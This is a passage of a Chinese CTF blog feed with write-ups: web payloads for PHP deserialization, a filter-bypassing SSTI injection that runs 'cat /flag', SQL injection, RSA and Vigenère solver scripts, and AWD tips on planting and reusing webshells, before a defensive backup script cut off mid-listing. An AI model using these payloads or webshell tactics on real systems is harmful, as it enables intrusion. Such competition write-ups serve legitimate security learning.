plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/index.php?p= O:6:&quot;person&quot;:5:&#123;s:4:&quot;name&quot;;s:0:&quot;&quot;;s:3:&quot;age&quot;;i:0;s:6:&quot;weight&quot;;i:0;s:6:&quot;height&quot;;i:0;s:17:&quot;%00person%00serialize&quot;;s:30:&quot;&quot;;high</span><br></pre></td></tr></table></figure><h2 id="IP-echo-service"><a href="#IP-echo-service" class="headerlink" title="IP echo service"></a>IP echo service</h2><p>本题考点为<a href="https://xz.aliyun.com/t/3679#toc-1">ssti注入</a>，而且过滤了双下划线<code>__</code>，百度过滤后的注入方法，先构造get请求</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=__class__&amp;b=__bases__&amp;s=__subclasses__&amp;i=__init__&amp;g=__globals__&amp;bt=__builtins__&amp;d=__import__(&#x27;os&#x27;).popen(&#x27;cat /flag&#x27;).read()</span><br></pre></td></tr></table></figure><p>再伪造ip利用ssti漏洞进行注入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">X-Forwarded-For: &#123;&#123;[][request.args.c][request.args.b][0][request.args.s]()[76][request.args.i][request.args.g][request.args.bt].eval(request.args.d)&#125;&#125;</span><br></pre></td></tr></table></figure><p>得到flag</p><p><a href="https://camo.githubusercontent.com/c3aa262caa4ab425ac16204f3c053b9ceddfec13d417e5698ace16a2d641998c/68747470733a2f2f692e6c6f6c692e6e65742f323032302f30352f30392f6755694b34685253464e7a3151586b2e706e67"><img src="https://camo.githubusercontent.com/c3aa262caa4ab425ac16204f3c053b9ceddfec13d417e5698ace16a2d641998c/68747470733a2f2f692e6c6f6c692e6e65742f323032302f30352f30392f6755694b34685253464e7a3151586b2e706e67" alt="image-20200509183253437"></a></p><h2 id="ezlogin"><a href="#ezlogin" class="headerlink" title="ezlogin"></a>ezlogin</h2><p>过滤逗号等号的无列名注入，PHP反序列化字符逃逸</p><p>注入做的非预期：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">logname=1&quot;||1 limit 1 offset 3#&amp;logpass=1</span><br></pre></td></tr></table></figure><p>得到<code>alert(&#39;Username:Flag_1s_heRe \nPassword:goto /flag327a6c4304a&#39;)</code>，访问。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$key = array(&#x27;php&#x27;,&#x27;flag&#x27;,&#x27;xdsec&#x27;);</span><br><span class="line">$filter = &#x27;/&#x27;.implode(&#x27;|&#x27;,$key).&#x27;/i&#x27;;</span><br><span class="line">return preg_replace($filter,&#x27;hack!!!!&#x27;,$payload);</span><br></pre></td></tr></table></figure><p>php 关键字被替换为 hack!!!! 之后，从3个字符变成了5个字符，但是反序列化的时候由于 s:3 的存在，这个值仍然会被当作三个字符来处理，造成逃逸。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload=phpphpphpphpphpphpphp&quot;;s:3:&quot;V0n&quot;;s:14:&quot;has_girlfriend&quot;;&#125;</span><br></pre></td></tr></table></figure><p>minil{7f3ea366-f5ab-463c-b511-af63d6dc7715}</p><p>题目思路来源<a href="https://github.com/XDSEC/moeCTF_2020">西电安全协会</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Crypto</title>
      <link href="/bufferfly/blog/1870933427.html"/>
      <url>/bufferfly/blog/1870933427.html</url>
      
        <content type="html"><![CDATA[<p>2021/10/21 更新了高位截肢</p><h1 id="高新区比赛"><a href="#高新区比赛" class="headerlink" title="高新区比赛"></a>高新区比赛</h1><p>V^3<br>好像是一个2017年的题改的<br>cnhongke{bf7e02677b4faab7808d1580fd5bb}<br>也可以手动爆破<br>就是按照对应关系<br>然后逐位加密<br>你会发现到第六个就开始变成对称了<br>所以手动跑5次就出结果了<br>exp都多余了<br>附上exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">s = <span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmnopqrstuvwxyz_&#123;&#125;&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_l</span>(<span class="params">idx, s</span>):</span></span><br><span class="line">    <span class="keyword">return</span> s[idx:] + s[:idx]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span>(<span class="params">ct, k1, k2</span>):</span></span><br><span class="line">    s = <span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmnopqrstuvwxyz_&#123;&#125;&quot;</span></span><br><span class="line">    t = [[_l((i + j) % <span class="built_in">len</span>(s), s) <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(s))] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(s))]</span><br><span class="line">    i1 = <span class="number">0</span></span><br><span class="line">    i2 = <span class="number">0</span></span><br><span class="line">    decrypted = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> a <span class="keyword">in</span> ct:</span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> s:</span><br><span class="line">            <span class="keyword">if</span> t[s.find(c)][s.find(k1[i1])][s.find(k2[i2])] == a:</span><br><span class="line">                decrypted += c</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        i1 = (i1 + <span class="number">1</span>) % <span class="built_in">len</span>(k1)</span><br><span class="line">        i2 = (i2 + <span class="number">1</span>) % <span class="built_in">len</span>(k2)</span><br><span class="line">    <span class="keyword">return</span> decrypted</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span>(<span class="params">p, k1, k2</span>):</span></span><br><span class="line">    t = [[_l((i + j) % <span class="built_in">len</span>(s), s) <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(s))] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(s))]</span><br><span class="line">    i1 = <span class="number">0</span></span><br><span class="line">    i2 = <span class="number">0</span></span><br><span class="line">    c = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> a <span class="keyword">in</span> p:</span><br><span class="line">        c += t[s.find(a)][s.find(k1[i1])][s.find(k2[i2])]</span><br><span class="line">        i1 = (i1 + <span class="number">1</span>) % <span class="built_in">len</span>(k1)</span><br><span class="line">        i2 = (i2 + <span class="number">1</span>) % <span class="built_in">len</span>(k2)</span><br><span class="line">    <span class="keyword">return</span> c</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">recover_key</span>(<span class="params">known_prefix, ciphertex</span>):</span></span><br><span class="line">    final_key = [<span class="string">&#x27;*&#x27;</span>] * <span class="number">14</span></span><br><span class="line">    <span class="keyword">for</span> pos <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> s:</span><br><span class="line">            partial_candidate_key = [<span class="string">&#x27;*&#x27;</span>] * <span class="number">14</span></span><br><span class="line">            partial_candidate_key[pos] = c</span><br><span class="line">            partial_candidate_key[<span class="number">13</span> - pos] = c</span><br><span class="line">            key = <span class="string">&quot;&quot;</span>.join(partial_candidate_key)</span><br><span class="line">            res = encrypt(known_prefix, key, key[::-<span class="number">1</span>])</span><br><span class="line">            <span class="keyword">if</span> res[pos] == ciphertex[pos]:</span><br><span class="line">                final_key[pos] = c</span><br><span class="line">                final_key[<span class="number">13</span> - pos] = c</span><br><span class="line">                <span class="built_in">print</span> <span class="string">&quot;&quot;</span>.join(final_key)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&quot;</span>.join(final_key)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    ciphertext = <span class="string">&quot;POR4dnyTLHBfwbxAAZhe&#125;&#125;ocZR3Cxcftw9&quot;</span></span><br><span class="line">    key = recover_key(<span class="string">&quot;SECCON&#123;&quot;</span>, ciphertext)</span><br><span class="line">    flag = decrypt(ciphertext, key, key[::-<span class="number">1</span>])</span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">main()</span><br></pre></td></tr></table></figure><h1 id="RSArepeat"><a href="#RSArepeat" class="headerlink" title="RSArepeat"></a>RSArepeat</h1><p>这题好像也有层一样的，比赛真lao<br>给出加密脚本</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from Crypto.Util.number import *</span><br><span class="line">import gmpy2</span><br><span class="line">import os</span><br><span class="line">from secret import flag</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p = gmpy2.next_prime(bytes_to_long(os.urandom(32) * 10))</span><br><span class="line">q = getPrime(2048)</span><br><span class="line">n = p * q</span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">e = 65537</span><br><span class="line">c = pow(m, e, n)</span><br><span class="line">print &#x27;n = &#x27; + str(n)</span><br><span class="line">print &#x27;c = &#x27; + str(c)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">运行结果输出</span><br><span class="line"># n = 9120210412817098868567410854637632250220555881403526554620639158581419400118706476426462580532569560128403528542849222604236640862674516611277130361890497616002043535833874824203278779255224103895976559478230598208736638548838369515266506758788653023380759388265524679357661867344583727639009050611035809615332415345615636794183389139631751072725812173232153921977529854299720035907475080123728133963132357285009229616899363413864250134103133772163607484794238528972871955212167583918722247406108717508117668301570190879613631465451744135100528987401664293214977426648232669628002711796584477405954390921585168542545024508132280795239187047607902042772074354512983547626983416047058674495234725402709185065533866399101327869049927071762987405052014360342557346201760417195526717659432120957024932822171629034785982161149134423193624715061013742839402782240625571812632970088905336230003285927069650264756078977556405903281928093668669291639199556779542688708405151017597677182338101624350346890556571828242761503472862589187188272783083175514693346986425145048900560704517281059296515380916946885637766528669652741939121435925118622627340581156923111326642804173809225000120356084999577920000481451709828075752253192537628742219663830938886966680564258836058435847445136469870523064012091603727249413340707659477419033271750976011384443208371660411376327908639483034074911057106131325663</span><br><span class="line"># c = 7068462753085070298092306006815948822917293261569147262935876173777154611330212172780298815871946045639185357656186163809499649889823797927617022879328397754544340874952687572138224768719999154448738757631265317915591819395360957051438805269461772096089208044993726972263528636921213722053915213474520713305628933165329554039041526341429811011879399124487420973883220496337343697082485151325947637134492168684404895651666064423117891350949942888278577264641878267652440305311472437072576068073588628794693349303196170011208043072754814062079404857657352761995684725014730958374555123902870761944058212939416619872746207245705213743023048901892977114871581000445118225605980711967279184600832881914000747237143653411293658641093111449235793736446421524719927367452081557329271167988711131750096910582920748875147684842547191116046110455610485921697703084407073334158845880179092914138111196153821093666870713318435216431977100255451151613217255214311447270315317924828002186873831048826117341746203538919869858723643158591679168166815433400943179342639989830429265410316662281946735133048179580170395697284908451588172527612828357594205617900793644449780703541620423822874332895281227408264377675840472406248296158342659308845264164232068007825845287325024564804783116616695927303806931940737550484802677095488750998780934178991718038605826623684585430755074719975767565185371149546480577</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/img/CRYPTO/gaoxinqu1.jpg" alt="avatar"><br><img src="/img/CRYPTO/gaoxinqu2.jpg" alt="avatar"></p><p>附上exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!python2</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @FileName: tt.py</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">n = <span class="number">5723803231105438067621879312731287221934357097569268166420520040038029065761152553810494005387890506233399584147246538077002208499639437803910245817342952372458171365752480055753844375305610474395282822742943102904320741363812652705261682747336617279332644951905181705937705454682585492345619282271549850191266841799115355201225481894665469006243078988838181049476985523095183211083306888898330855716843411424493132244378006508444594329543929521327878717314543259397842391141445238073295183064204038877358053346160904246766744058035260700906186262991418344028036927076898224775513313992135215728859733003918328707361999295628679324987941544108516966440200369017207031702010292125100166826894159577761774445100777211415862293977599736904535299914065534202980062824965765410888738320552504576390375348702993646394541895827629891842496139670703262245710062952138603857926812293927639685763696276258111848707179034963859209200388611940617575570592428927246122690317085150458638646993030523460057013506016279214894927343923461607646478524983809407592464446504390449868558006440884166283766345457345779137687215125369153544179042534504852071842244821976629524307628462619103368289645015324069375881393414723379127777033799199839545069927720992165031027897683055528657202955467661225465098604530590852960596629917086084805687598732530884961789893076147057895925224397540225533098516204541840889</span></span><br><span class="line">t=bytes_to_long((<span class="string">&#x27;\x00&#x27;</span>*<span class="number">31</span>+<span class="string">&#x27;\x01&#x27;</span>)*<span class="number">10</span>)</span><br><span class="line"><span class="comment">#print t</span></span><br><span class="line">K = Zmod(n)</span><br><span class="line">P.&lt;x&gt; = PolynomialRing(K)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">100000</span>):</span><br><span class="line">    r =(x *t +i).monic().small_roots(beta=<span class="number">0.45</span>)</span><br><span class="line">    <span class="keyword">if</span> r:</span><br><span class="line">        <span class="built_in">print</span> i,r</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="维吉尼亚"><a href="#维吉尼亚" class="headerlink" title="维吉尼亚"></a>维吉尼亚</h1><p>听名字就知道</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Vvr Ifnvaus Bdwokv Gbtrzsa Vkqgofntja rrlznxk eflvkozjcdue rs “mzg oez ff pjkhvtx ok kqzioeg vgfsf.” Zyil au vvykokaeoyrp avuwfnzv, bnl fcry eom ucdgaie mzg qhxiegl dfrguta gh huk wixdf ce oks ijggrtk-dtq uqvketbxkq sulnwsvwbtj. Taw fssoeimaqb sutulwu gbrvlr gp huk towwu hugk htng prke ulwf tbx teglwfvkj th wpoorv sxutsg ifmfmpwpgkihf. Dig iiyilquegghr fqknjryl wpqbsgalkgg zath fgts gnrn mzkg: vz uetdu kvzy mxujoaojml xqf rtjukapu vtkezjkhl, zvcafkehkj fhj glpnrnzapu fktrxl msly, grhlqqbrj fhj cignvnmaeogoeg nkgff, kcevltcaot anuvwbtj agv gzrikihfu, rvmzttd eofn, rnw eqfr. Cztagwh nzkefhvwam ko ijqjvjv a vgodykke vzcfnikekabogofn, pw ychru stq vvnz dowwtb pxppmgifnvyy bfxcybvs mzg ggauy hx oognvmtlkqnr kevzpwdavs ygt grilrbfi rvmzttd kbsuimtlkca, ypsmwog, ntu dbkvfvhltxv eczvlttlkcay rgtapgg guvxjuoeorl tlvopqj. CgZqbtQv&#123;3ayuc4r633096o2737&#125;</span><br></pre></td></tr></table></figure><p>直接维吉尼亚枚举</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">The Concise Oxford English Dictionary defines cryptography as “the art of writing or solving codes.” This is historically accurate, but does not capture the current breadth of the field or its present-day scientific foundations. The definition focuses solely on the codes that have been used for centuries to enable secret communication. But cryptography nowadays encompasses much more than this: it deals with mechanisms for ensuring integrity, techniques for exchanging secret keys, protocols for authenticating users, electronic auctions and elections, digital cash, and more. Without attempting to provide a complete characterization, we would say that modern cryptography involves the study of mathematical techniques for securing digital information, systems, and distributed computations against adversarial attacks. CnHongKe&#123;3afca4d633096b2737&#125;</span><br></pre></td></tr></table></figure><p>真lao</p><h1 id="高位截肢"><a href="#高位截肢" class="headerlink" title="高位截肢"></a>高位截肢</h1><p>題目源代碼</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randint</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">m = bytes_to_long(<span class="string">b&#x27;flag&#123;********************************&#125;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getprime</span>(<span class="params">bits</span>):</span></span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        n = <span class="number">1</span></span><br><span class="line">        <span class="keyword">while</span> n.bit_length() &lt; bits:</span><br><span class="line">            n *= next_prime(randint(<span class="number">1</span>,<span class="number">1000</span>))</span><br><span class="line">        <span class="keyword">if</span> isPrime(n - <span class="number">1</span>):</span><br><span class="line">            <span class="keyword">return</span> n - <span class="number">1</span></span><br><span class="line"></span><br><span class="line">p = getprime(<span class="number">512</span>)</span><br><span class="line">q = getprime(<span class="number">512</span>)</span><br><span class="line">n = p*q</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">d = invert(e,(p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line">c = <span class="built_in">pow</span>(m,e,n)</span><br><span class="line"></span><br><span class="line">res = []</span><br><span class="line">mod = []</span><br><span class="line">[mod.append(getprime(<span class="number">128</span>)) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">12</span>)]</span><br><span class="line">[res.append(c%mod[i]) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">12</span>)]</span><br><span class="line"><span class="built_in">print</span>(n,(p&gt;&gt;<span class="number">128</span>)&lt;&lt;<span class="number">128</span>),mod,res)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">output:</span></span><br><span class="line"><span class="string">3216831712236484919804716473942409526434016529181790011140718891645020999952523287950679312500771653918738887189899203815116997399422419456666136527466294225647700744715569996552708989626431982330367733125015062070399091789218760399060531383324158096784030850407432126491091299460659042468401054516052600467997</span></span><br><span class="line"><span class="string">36691536769373164488130311421517753226870999465362409179446664596323017708216823951466573340643687346264018616414288774195411449434676147898363218552160256</span></span><br><span class="line"><span class="string">[127358722814661886628344839530462144916373, 1569005233424413714924223862235964763229, 15953826944429720811716497916877126603181, 22667750449179799152236917772041505492557, 7259500259309895932387328648172298540473, 1216723397014858024629084355784570444737, 5803969258694833349275399163572927306963, 2847514965593473340352693322675908465517, 55965603506094486681210827499140188004581, 3758825246939161175629619499256754206153, 9865309015695677187200661453839724337633, 1985189335531812324455545509044214546841)]</span></span><br><span class="line"><span class="string">[17514122934988110165886587218707943859589, 828023569353871016099054873610645592579, 3834965867062595899595546144451189629655, 5083410101797762407471893731877939884166, 6199590917760184276466050254032811548454, 208337506454727094683323122852921121527, 5210709327454808237359999225611588134922, 239093795148407379152016295908193630983, 29793049900271876372064873251244672365333, 1641943491807405218384351799880631607416, 1685895805013787734204509484411577153108, 1511298522529374764380482522275435302730)]</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>高位攻擊恢復p+crt<br>給大家推薦幾個高位攻擊回復p的blog<br><a href="https://blog.csdn.net/lostnerv/article/details/106009127">https://blog.csdn.net/lostnerv/article/details/106009127</a></p><p><a href="https://www.jianshu.com/p/e407be39a22b">https://www.jianshu.com/p/e407be39a22b</a></p><p>上脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> sympy <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#sage</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">#高位p</span></span><br><span class="line"><span class="string">e = 65537</span></span><br><span class="line"><span class="string">n = 3216831712236484919804716473942409526434016529181790011140718891645020999952523287950679312500771653918738887189899203815116997399422419456666136527466294225647700744715569996552708989626431982330367733125015062070399091789218760399060531383324158096784030850407432126491091299460659042468401054516052600467997</span></span><br><span class="line"><span class="string">pbar = 36691536769373164488130311421517753226870999465362409179446664596323017708216823951466573340643687346264018616414289061014410434943387973225734363385787789</span></span><br><span class="line"><span class="string">kbits = 128</span></span><br><span class="line"><span class="string">print(&quot;upper %d bits (of %d bits) is given&quot; % (pbar.nbits()-kbits, pbar.nbits()))</span></span><br><span class="line"><span class="string">PR.&lt;x&gt; = PolynomialRing(Zmod(n))</span></span><br><span class="line"><span class="string">f = x + pbar</span></span><br><span class="line"><span class="string">x0 = f.small_roots(X=2^kbits, beta=0.4)[0]  # find root &lt; 2^kbits with factor &gt;= n^0.4</span></span><br><span class="line"><span class="string">p = x0 + pbar</span></span><br><span class="line"><span class="string">print(&quot;p:&quot;, p)</span></span><br><span class="line"><span class="string">#crt求c</span></span><br><span class="line"><span class="string">crt([17514122934988110165886587218707943859589, 828023569353871016099054873610645592579, 3834965867062595899595546144451189629655, 5083410101797762407471893731877939884166, 6199590917760184276466050254032811548454, 208337506454727094683323122852921121527, 5210709327454808237359999225611588134922, 239093795148407379152016295908193630983, 29793049900271876372064873251244672365333, 1641943491807405218384351799880631607416, 1685895805013787734204509484411577153108, 1511298522529374764380482522275435302730],[127358722814661886628344839530462144916373, 1569005233424413714924223862235964763229, 15953826944429720811716497916877126603181, 22667750449179799152236917772041505492557, 7259500259309895932387328648172298540473, 1216723397014858024629084355784570444737, 5803969258694833349275399163572927306963, 2847514965593473340352693322675908465517, 55965603506094486681210827499140188004581, 3758825246939161175629619499256754206153, 9865309015695677187200661453839724337633, 1985189335531812324455545509044214546841])</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">c = <span class="number">1077233712188252453962763215420078090384941182152999954278038468778840824135535740613334922110769959923025621861732351020130627648669752220543773285487384058164614139587422610914396593954389899763791857297268825420364912075493471765126196898848111738107851858382589951634394904231520912326280908229934082041817</span></span><br><span class="line">n = <span class="number">3216831712236484919804716473942409526434016529181790011140718891645020999952523287950679312500771653918738887189899203815116997399422419456666136527466294225647700744715569996552708989626431982330367733125015062070399091789218760399060531383324158096784030850407432126491091299460659042468401054516052600467997</span></span><br><span class="line">p = <span class="number">36691536769373164488130311421517753226870999465362409179446664596323017708216823951466573340643687346264018616414289061014410434943387973225734363385787789</span></span><br><span class="line">q = n//p</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">d = invert(e, (p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line">m = <span class="built_in">pow</span>(c, <span class="built_in">int</span>(d), n)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br></pre></td></tr></table></figure><p>flag{5bb5e0a9d48f44a3770253875f263810}<br><img src="/img/CRYPTO/gaowei1.jpg" alt="avatar"></p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>AWD</title>
      <link href="/bufferfly/blog/173175039.html"/>
      <url>/bufferfly/blog/173175039.html</url>
      
        <content type="html"><![CDATA[<ol><li>给的是ctf低权限账号，但是中间件运行的是www-data权限，通常比ctf权限高，有些马用ssh上去删不掉，可以先传个自己的shell然后去删，当然得做一个防止被偷家的措施，比如说加一个if (‘xxx’===md5(key))的操作。也可以用www-data去对文件和目录做权限的修改等操作。</li><li>黑吃黑，直接用别的队伍上传的shell。</li><li>不是特别大型的比赛没有那么多的时间去审漏洞，通常用nday直接打，或者内置的shell后门。</li><li>批量拿flag并自动提交平台；自动备份与恢复自己的靶机文件。网上找的确实不会用</li></ol><h1 id="AWD线下赛防守脚本："><a href="#AWD线下赛防守脚本：" class="headerlink" title="AWD线下赛防守脚本："></a>AWD线下赛防守脚本：</h1><p>1.该脚本基于python，可直接在linux靶机上运行。</p><p>2.开局直接运行起来，会自动对web目录进行备份，并建立hash索引。当web目录下有文件被删除或者被篡改的时候，会自动从备份中恢复文件。如果存在其他文件上传，会自动删除。</p><p>3.无法避免的缺点：由于条件竞争，如果对方在我们删除shell之前就已经在内存中开始生成不死马了，还是有一定几率沦陷。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span 